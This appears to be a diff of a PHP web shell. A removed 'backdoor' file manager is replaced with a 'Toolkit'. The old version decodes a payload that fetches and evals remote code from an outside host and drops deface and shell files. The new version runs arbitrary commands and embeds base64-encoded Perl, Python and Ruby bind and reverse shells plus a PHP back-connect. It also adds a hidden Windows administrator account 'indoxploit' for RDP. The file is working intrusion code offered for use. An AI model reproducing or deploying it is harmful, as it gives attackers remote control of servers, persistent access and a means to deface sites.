@@ -1,130 +1,159 @@
 <?php
-// My own simple backdoor
-// Idk but this could bypass 403 in Litespeed lol
-// N4ST4R_ID | Naxtarrr
-error_reporting(0);
-$shell = base64_decode("PD89LyoqKiovQG51bGw7IC8qKioqKioqKi8gLyoqKioqKiovIC8qKioqKioqKi9AZXZhbC8qKioqLygiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzLyoqKioqKiovKCJodHRwOi8vbmF4dGFycnIuZm9ydHlzaW5jLmNvbS9tLnR4dCIpKTsvKiovPz4=");
-$deface = base64_decode("SGFja2VkIEJ5IE40U1Q0Ul9JRCB8IEQ3MDRUIEhla2VyIFRlYW0=");
-echo "Home: <a href='?path=".getcwd()."' style='color:#000;text-decoration:none;'>".getcwd()."</a><br>";
-if(isset($_GET["path"])) echo "Current dir: <a href='?path=".htmlspecialchars($_GET["path"])."' style='color:#000;text-decoration:none;'>".htmlspecialchars($_GET["path"])."</a><br>";
-?>
+$curl = (function_exists('curl_version')) ? "ON" : "OFF";
+$wget = (@shell_exec('wget --help')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
+$perl = (@shell_exec('perl --help')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
+$ruby = (@shell_exec('ruby --help')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
+$python = (@shell_exec('python --help')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
+$gcc = (@shell_exec('gcc --help')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
+$pkexec = (@shell_exec('pkexec --help')) ? "<font color='green'>ON</font>" : "<font color='red'>OFF</font>";
 
-<form method="GET">
-  <input type="text" name="path" autocomplete="off" style="width:300px">
-  <input type="submit" value="Go!!">
-</form>
+echo php_uname();
+echo "<br>CURL : ".$curl.", WGET : ".$wget;
+echo ", PERL : ".$perl.", RUBY : ".$ruby.", PYTHON : ".$python.", GCC : ".$gcc.", PKEXEC : ".$pkexec."<br>";
 
-<?php
-if(htmlspecialchars(isset($_GET["path"]))) {
-  ?>
-  
-  <script>
-    const path = document.querySelector('input[name=path]')
-    path.value = '<?php echo $_GET["path"]; ?>'
-  </script>
-  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=create"><button type="button" name="create">Create file</button></a>
-  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=spawnShell"><button type="button" name="shell">Spawn shell</button></a>
-  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=spawnDeface"><button type="button" name="deface">Spawn deface</button></a>
-  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=rename"><button type="button" name="rename">Rename file</button></a>
-  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=info"><button type="button" name="infokan">Info min</button></a>
-  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=upload"><button type="button" name="upload">Upload file</button></a><br>
-  <form method="POST" style="margin-top:10px;">
-    <input type="text" name="delete" autocomplete="off">
-    <input type="submit" name="delt" value="Delete">
-    <input type="text" name="view" autocomplete="off">
-    <input type="submit" name="lihat" value="View">
-  </form>
-  
-  <?php
-  if(array_key_exists("delt", $_POST) && array_key_exists("delete", $_POST)) {
-    $del = unlink($_GET["path"]."/".$_POST["delete"]);
-    if($del) {
-      echo "<script>alert('".$_POST["delete"]." deleted!')</script>";
-      echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
-    } else {
-      echo "Delete file failed";
-    }
-  } elseif(array_key_exists("view", $_POST) && array_key_exists("lihat", $_POST)) {
-    echo "<textarea cols='60' rows='15' disabled>".htmlspecialchars(file_get_contents($_GET["path"]."/".$_POST["view"]))."</textarea>";
-  } elseif($_GET["path"] && $_GET["action"] == "spawnShell") {
-    $op = fopen($_GET["path"]."/shell.php", "w");
-    fwrite($op, $shell);
-    fclose($op);
-    if($op) {
-      echo "<script>alert('Spawn shell.php success')</script>";
-      echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
-    } else {
-      echo "Spawn shell.php failed";
-    }
-  } elseif($_GET["path"] && $_GET["action"]== "spawnDeface") {
-    $def = fopen($_GET["path"]."/nax.txt", "w");
-    fwrite($def, $deface);
-    fclose($def);
-    if($def) {
-      echo "<script>alert('Spawn nax.txt success')</script>";
-      echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
-    } else {
-      echo "Spawn nax.txt failed";
-    }
-  } elseif($_GET["path"] && $_GET["action"] == "create") {
-    ?>
-    <br>
-    <form method="POST">
-      <input type="text" name="filename" placeholder="Filename" style="width:410px;margin-bottom:5px;"><br>
-      <textarea cols="50" rows="10" name="filetext"></textarea><br>
-      <input type="submit" name="touch" value="Create" style="margin:5px 125px;padding:5px 50px;">
-    </form>
-    <?php
-    if(isset($_POST["touch"])) {
-      $filename = $_POST["filename"];
-      $filetext = base64_encode($_POST["filetext"]);
-      $touch = fopen($_GET["path"]."/".$filename, "w");
-      fwrite($touch, base64_decode($filetext));
-      fclose($touch);
-      if($touch) {
-        echo "<script>alert('".$filename." has successfully created')</script>";
-        echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
-      } else {
-        echo "Create file failed";
-      }
-    }
-  } elseif($_GET["path"] && $_GET["action"] == "rename") {
-    ?>
-    <form method="POST">
-      <input type="text" name="old">
-      <input type="text" name="new">
-      <input type="submit" name="rename" value="Rename">
-    </form>
-    <?php
-    if(isset($_POST["rename"])) {
-      $ren = rename($_GET["path"]."/".$_POST["old"], $_GET["path"]."/".$_POST["new"]);
-      if($ren) {
-        echo "<script>alert('".$_POST["old"]." renamed to ".$_POST["new"]."')</script>";
-        echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
-      }
-    }
-  } else if($_GET["path"] && $_GET["action"] == "upload") {
-    echo "<form method=\"post\" enctype=\"multipart/form-data\">\n";
-    echo "<input type=\"file\" name=\"newfile\"> \n";
-    echo "<input type=\"submit\" name='up' value=\"OK\"><br>\n";
-    echo "</form>\n";
-    if(isset($_POST["up"])) {
-      if(move_uploaded_file($_FILES["newfile"]["tmp_name"], $_GET["path"]."/".$_FILES["newfile"]["name"])) {
-      	  $file = $_FILES["newfile"]["name"];
-      	echo "<script>alert('$file uploaded')</script>";
-      	echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
-      } else {
-      	echo "Upload fail";
-      }
-    } else {
-      echo "No file selected";
-    }
-  } elseif($_GET["path"] && $_GET["action"] == "info") {
-    phpinfo();
-  } else {
-    foreach(scandir(htmlspecialchars($_GET["path"])) as $patg) {
-      echo $patg."<br>";
-    }
+if(isset($_GET["cmd"])) {
+  echo "<form method='post'>
+       <label for='cmd'>Command: </label>
+       <input type='text' name='cmd' id='cmd' autocomplete='off'>
+       <input type='submit' name='exec' value='Exec'>
+       </form>";
+  if(isset($_POST["exec"])) {
+    echo "<textarea style='height:135px ;width:455px;'>".@shell_exec($_POST["cmd"])."</textarea>";
   }
+} elseif(isset($_GET["network"])) {
+  echo "<h4 class='text-center mb-4'>Back Connect Tools</h4>
+    <form method='post'>
+        <div class='row'>
+            <div class='col-md-10'>
+                <span>Bind port to /bin/sh [Perl]</span><br/>
+                <label>Port :</label>
+                <div class='form-group input-group mb-4'>
+                    <input type='text' name='port' class='form-control' value='6969'>
+                    <input type='submit' name='bpl' class='btn btn-danger form-control' value='Reserve'>
+                </div>
+                <h5>Back-Connect</h5>
+                <label>Server :</label>
+                <input type='text' name='server' class='form-control mb-3' placeholder='".$_SERVER['REMOTE_ADDR']."' autocomplete='off'><br>
+                <label>Port :</label>
+                    <input type='text' name='port' class='form-control' placeholder='443' autocomplete='off'><br>
+                    <select class='form-control' name='backconnect'>
+                        <option value='perl'>Perl</option>
+                        <option value='php'>PHP</option>
+                        <option value='python'>Python</option>
+                        <option value='ruby'>Ruby</option>
+                    </select>
+                <input type='submit' class='btn btn-danger btn-block' value='Connect'>
+            </div>
+        </div>
+    </form>";
+    if ($_POST['bpl']) {
+        $bp = base64_decode('IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=');
+        $brt = @fopen('bp.pl', 'w');
+        fwrite($brt, $bp);
+        $out = exe('perl bp.pl '.$_POST['port'].' 1>/dev/null 2>&1 &');
+        sleep(1);
+        echo "<pre class='text-light'>$out\n".exe('ps aux | grep bp.pl').'</pre>';
+        unlink('bp.pl');
+    }
+    if ($_POST['backconnect'] == 'perl') {
+        $bc = base64_decode('IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7');
+        $plbc = @fopen('bc.pl', 'w');
+        fwrite($plbc, $bc);
+        $out = exe('perl bc.pl '.$_POST['server'].' '.$_POST['port'].' 1>/dev/null 2>&1 &');
+        sleep(1);
+        echo "<pre class='text-light'>$out\n".exe('ps aux | grep bc.pl').'</pre>';
+        unlink('bc.pl');
+    }
+    if ($_POST['backconnect'] == 'python') {
+        $becaa = base64_decode('IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=');
+        $pbcaa = @fopen('bcpyt.py', 'w');
+        fwrite($pbcaa, $becaa);
+        $out1 = exe('python bcpyt.py '.$_POST['server'].' '.$_POST['port']);
+        sleep(1);
+        echo "<pre class='text-light'>$out1\n".exe('ps aux | grep bcpyt.py').'</pre>';
+        unlink('bcpyt.py');
+    }
+    if ($_POST['backconnect'] == 'ruby') {
+        $becaak = base64_decode('IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k');
+        $pbcaak = @fopen('bcruby.rb', 'w');
+        fwrite($pbcaak, $becaak);
+        $out2 = exe('ruby bcruby.rb '.$_POST['server'].' '.$_POST['port']);
+        sleep(1);
+        echo "<pre class='text-light'>$out2\n".exe('ps aux | grep bcruby.rb').'</pre>';
+        unlink('bcruby.rb');
+    }
+    if ($_POST['backconnect'] == 'php') {
+        $ip = $_POST['server'];
+        $port = $_POST['port'];
+        $sockfd = fsockopen($ip, $port, $errno, $errstr);
+        if ($errno != 0) {
+            echo "<font color='red'>$errno : $errstr</font>";
+        } elseif (!$sockfd) {
+            $result = '<p>Unexpected error has occured, connection may have failed.</p>';
+        } else {
+            fwrite($sockfd, "
+            \n{#######################################}
+            \n..:: BackConnect PHP By Con7ext ::..
+            \n{#######################################}\n");
+            $dir = @shell_exec('pwd');
+            $sysinfo = @shell_exec('uname -a');
+            $time = @shell_exec('time');
+            $len = 1337;
+            fwrite($sockfd, 'User ', $sysinfo, 'connected @ ', $time, "\n\n");
+            while (!feof($sockfd)) {
+                $cmdPrompt = '[kuda]#:> ';
+                @fwrite($sockfd, $cmdPrompt);
+                $command = fgets($sockfd, $len);
+                @fwrite($sockfd, "\n".@shell_exec($command)."\n\n");
+            }
+            @fclose($sockfd);
+        }
+    }
+    exit;
+} elseif(isset($_GET["krdp"])) {
+  $args = explode(" ", $args);
+  $os = (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+  if($os !== "Windows") die("Not windows");
+  
+  if(preg_match("/indoxploit/", system("net user"))) die(color(1, 1, "[INFO] username 'indoxploit' already exists."));
+  
+  $add_user   = system("net user indoxploit indoxploit /add");
+  $add_groups1 = system("net localgroup Administrators indoxploit /add");
+  $add_groups2 = system("net localgroup Administrator indoxploit /add");
+  $add_groups3 = system("net localgroup Administrateur indoxploit /add");
+  
+  print "[ RDP ACCOUNT INFO ]<br>
+      	------------------------------<br>
+      	IP: ".$GLOBALS['SERVERIP']."<br>
+      	Username: indoxploit <br>
+      	Password: indoxploit <br>
+      	------------------------------<br><br>
+      	[ STATUS ]<br>
+      	------------------------------<br>
+      	";
+  
+   if($add_user) {
+    print "[add user] -> SUCCESS <br>";
+  } 
+  else {
+    print "[add user] -> FAILED <br>";
+  }
+      	
+  if($add_groups1) {
+    print "[add localgroup Administrators] -> SUCCESS <br>";
+  } 
+  elseif($add_groups2) {
+    print "[add localgroup Administrator] -> SUCCESS <br>";
+  } 
+  elseif($add_groups3) { 
+    print "[add localgroup Administrateur] -> SUCCESS <br>";
+  } 
+  else {
+    print "[add localgroup] -> FAILED <br>";
+  }
+  
+  print "------------------------------<br>";
+} else {
+  echo "Toolkit";
 }
 ?>
